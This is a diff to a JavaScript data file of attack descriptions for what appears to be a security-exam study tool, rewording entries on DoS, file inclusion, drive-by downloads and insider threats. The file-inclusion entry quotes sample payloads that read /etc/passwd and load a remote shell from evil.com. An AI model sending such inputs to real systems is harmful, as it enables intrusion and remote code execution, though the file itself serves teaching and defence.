@@ -879,11 +879,11 @@ const ATTACK_DATA = [
       {
         name: 'DoS (Denial of Service)',
         severity: 'high',
-        desc: 'A single-source attack that overwhelms a target system with traffic or requests, making it unavailable to legitimate users.',
-        howItWorks: 'Attacker floods target with traffic, connection requests, or malformed packets from one source. Types: volumetric (bandwidth exhaustion), protocol (connection table exhaustion), application layer (HTTP floods). Easier to block than DDoS since traffic comes from a single IP.',
-        mitigation: 'Rate limiting, firewall ACLs blocking the source IP, ISP-level filtering, over-provisioning resources.',
-        examTip: 'DoS = single source. DDoS = multiple distributed sources (botnet). DoS is easier to mitigate because you can block one IP. DDoS requires scrubbing services.',
-        tags: ['availability','single source','flood','domain 3']
+        desc: 'A single-source attack that floods a target system with traffic or requests to exhaust resources and deny service to legitimate users.',
+        howItWorks: 'One attacker machine sends overwhelming traffic or malformed packets to target. Types: Volumetric (bandwidth flood), Protocol (SYN flood from single host, exhausting connection tables), Application layer (HTTP GET flood targeting app logic). Easier to block than DDoS since all traffic originates from a single IP.',
+        mitigation: 'Rate limiting, firewall ACLs to block attacker IP, ISP-level null routing, resource over-provisioning, connection limits.',
+        examTip: 'DoS = single source. DDoS = multiple distributed sources (botnet). Key distinction: DoS is easy to mitigate (block one IP). DDoS requires scrubbing services because traffic comes from everywhere.',
+        tags: ['availability','single-source','flood','domain 3']
       },
       {
         name: 'Man-in-the-Middle (MitM)',
@@ -1079,10 +1079,10 @@ const ATTACK_DATA = [
       {
         name: 'File Inclusion (LFI/RFI)',
         severity: 'high',
-        desc: 'Exploiting insecure file inclusion functions to load unauthorized local files (LFI) or remote malicious scripts (RFI) through web application parameters.',
-        howItWorks: 'LFI: ?page=../../../etc/passwd → server reads local system files. RFI: ?page=http://evil.com/shell.php → server downloads and executes remote malicious script. PHP applications are most commonly vulnerable when include() uses user input.',
-        mitigation: 'Whitelist allowed file names, disable allow_url_include in PHP, input validation, use absolute paths, WAF rules.',
-        examTip: 'LFI reads local files (like path traversal but executes them). RFI executes remote code — more severe. Both exploit unsanitized file path parameters.',
+        desc: 'Exploiting insecure file-inclusion functions to load unauthorized local system files (LFI) or execute remote malicious scripts (RFI) via web application parameters.',
+        howItWorks: 'LFI: vulnerable PHP uses include($_GET[\'page\']). Attacker sends ?page=../../etc/passwd — server reads and returns the file. RFI: ?page=http://evil.com/shell.php — server fetches and executes remote script. RFI requires allow_url_include=On in PHP. Both exploit lack of input sanitization on file paths.',
+        mitigation: 'Whitelist allowed file names, disable PHP allow_url_include and allow_url_fopen, never pass user input directly to include()/require(), use absolute paths, apply WAF rules.',
+        examTip: 'LFI reads/executes local files (escalation of path traversal). RFI executes remote code — more severe. Both exploit unsanitized file path parameters in PHP/web apps.',
         tags: ['PHP','LFI','RFI','file inclusion','domain 4']
       },
       {
@@ -1525,11 +1525,11 @@ const ATTACK_DATA = [
       {
         name: 'Drive-by Download',
         severity: 'high',
-        desc: 'Automatic malware download triggered simply by visiting a compromised or malicious website — no user click required beyond loading the page.',
-        howItWorks: 'Attacker compromises a legitimate website or creates a malicious one. Injected JavaScript exploits browser or plugin vulnerabilities (unpatched Flash, PDF readers, Java). Victim visits page → exploit fires → malware downloaded and executed silently.',
-        mitigation: 'Keep browsers and plugins updated, use ad blockers/script blockers (NoScript), web filtering proxies, sandboxed browsing, disable outdated plugins.',
-        examTip: 'Drive-by download requires zero user interaction beyond visiting the page. Related to Watering Hole attacks — both use compromised/malicious websites but drive-by is passive.',
-        tags: ['browser exploit','passive','watering hole','domain 2']
+        desc: 'Automatic malware download triggered solely by visiting a compromised or malicious website — no user click beyond page load required.',
+        howItWorks: 'Attacker compromises a legitimate site or creates a malicious one. Injected JavaScript fingerprints visitor browser/plugins, then fires an exploit kit targeting unpatched vulnerabilities (browser, PDF reader, Java). Payload downloads and executes silently in background. User sees nothing unusual.',
+        mitigation: 'Keep browsers and all plugins updated, disable outdated plugins (Flash, Java), use script blockers (uBlock Origin, NoScript), web filtering proxy, sandboxed browsing environments, EDR.',
+        examTip: 'Drive-by download = passive — user just visits the page. Contrast with baiting (user chooses to click). Related to Watering Hole attacks (both use compromised websites, but watering hole targets a specific group).',
+        tags: ['browser exploit','passive','watering hole','drive-by','domain 2']
       },
       {
         name: 'Lateral Movement',
@@ -1634,39 +1634,40 @@ const ATTACK_DATA = [
       },
     ]
   },
-  // ══════════════════════════════════════════════════
+
+  // ══════════════════════════════════════════
   {
     id: 'insider-threats',
     name: 'Insider Threats',
     icon: '🕵️',
     color: '#ffd32a',
-    desc: 'Security threats originating from within the organization — employees, contractors, or partners who misuse their authorized access, intentionally or through negligence.',
+    desc: 'Security threats originating from within the organization — employees, contractors, or business partners who misuse their authorized access, either intentionally or through negligence.',
     attacks: [
       {
         name: 'Malicious Insider',
         severity: 'critical',
-        desc: 'An employee, contractor, or partner who intentionally misuses their legitimate access to steal data, sabotage systems, or assist external attackers.',
-        howItWorks: 'Disgruntled employee exfiltrates intellectual property before resignation. Contractor plants a logic bomb. Privileged admin creates hidden backdoor accounts. Insider sells credentials to threat actors. Has authorized access so activity blends in with normal behavior.',
-        mitigation: 'User Entity Behavior Analytics (UEBA), DLP solutions, least privilege, separation of duties, mandatory vacation policy, access reviews, strict offboarding procedures.',
-        examTip: 'Malicious insider is the hardest threat to detect — activity looks authorized. Key controls: UEBA (detects behavioral anomalies), DLP (catches exfiltration), separation of duties (limits what any one person can do alone).',
+        desc: 'An employee, contractor, or partner who intentionally abuses their legitimate access to steal data, sabotage systems, commit fraud, or assist external attackers.',
+        howItWorks: 'Disgruntled employee exfiltrates intellectual property to USB before resignation. Privileged admin creates hidden backdoor accounts. Insider sells valid credentials to a threat actor for payment. Activity blends in because access is authorized — no perimeter alarm fires.',
+        mitigation: 'User Entity Behavior Analytics (UEBA) to detect anomalies, DLP (Data Loss Prevention) to block exfiltration, least privilege, separation of duties, mandatory vacation policy to surface hidden fraud, strict offboarding procedures.',
+        examTip: 'Malicious insider is the hardest threat to detect — the activity looks authorized. Key controls: UEBA (detects behavioral anomalies), DLP (catches data movement), separation of duties (no single person controls full process).',
         tags: ['insider','intentional','DLP','UEBA','domain 2']
       },
       {
         name: 'Negligent Insider',
         severity: 'medium',
-        desc: 'An employee who unintentionally causes a security incident through careless actions — clicking phishing links, misconfiguring systems, or mishandling sensitive data.',
-        howItWorks: 'Employee clicks phishing link → installs malware. Developer commits API keys to public GitHub repo. Admin misconfigures S3 bucket to public. Employee loses unencrypted laptop with PII. No malicious intent — poor security hygiene or lack of awareness.',
-        mitigation: 'Security awareness training, phishing simulations, data handling policies, technical controls (DLP, endpoint encryption), configuration management tools.',
-        examTip: 'Negligent insider = accidental, not malicious. The majority of insider incidents are negligent. Security awareness training is the primary countermeasure.',
+        desc: 'An employee who unintentionally causes a security incident through careless or uninformed actions — not malice, but poor security hygiene or lack of awareness.',
+        howItWorks: 'Employee clicks phishing link → installs malware on corporate machine. Developer accidentally commits API keys or database credentials to a public GitHub repo. Admin misconfigures an S3 bucket to public access. Employee loses unencrypted laptop containing PII. No harmful intent — just insufficient training or attention.',
+        mitigation: 'Security awareness training (phishing simulations, regular refreshers), clear data handling policies, technical controls (DLP, mandatory disk encryption, USB restrictions), configuration management and IaC scanning.',
+        examTip: 'Negligent insider = accidental, not malicious. The majority of insider incidents are negligent. Primary countermeasure is security awareness training. Technical controls are the backstop.',
         tags: ['insider','accidental','training','human error','domain 2']
       },
       {
         name: 'Third-Party / Contractor Risk',
         severity: 'high',
-        desc: 'Security risks from vendors, contractors, or partners who have authorized access but fall outside the organization\'s direct security controls.',
-        howItWorks: 'Vendor VPN credentials compromised → attacker pivots into internal network (SolarWinds pattern). Contractor with excessive permissions accesses data beyond job scope. Third-party software introduces vulnerable code into supply chain.',
-        mitigation: 'Vendor risk assessments, least privilege for third-party access, time-limited credentials, network segmentation for vendor connections, contractual security requirements, regular audits.',
-        examTip: 'Third-party risk is distinct from employee insider threat. Controls: VPN with MFA, time-limited access windows, vendor security assessments, and contractual SLAs for security standards.',
+        desc: 'Security risks introduced by vendors, contractors, or business partners who have authorized access to systems but fall outside the organization\'s direct security controls.',
+        howItWorks: 'Vendor VPN credentials compromised — attacker pivots into internal network (SolarWinds pattern: 18,000+ organizations breached via trusted software update). Contractor with excessive permissions accesses data beyond job scope. Third-party software component contains vulnerable or malicious code injected into supply chain.',
+        mitigation: 'Vendor risk assessments before onboarding, least privilege for third-party access (time-limited, scoped credentials), MFA on all VPN connections, network segmentation for vendor access, contractual security requirements and right-to-audit clauses.',
+        examTip: 'Third-party risk spans insider threat and supply chain. Key controls: VPN with MFA, time-limited access windows, vendor security assessments (questionnaires, SOC 2 reports), and contractual SLAs for security standards.',
         tags: ['vendor','contractor','third-party','VPN','domain 2']
       },
     ]
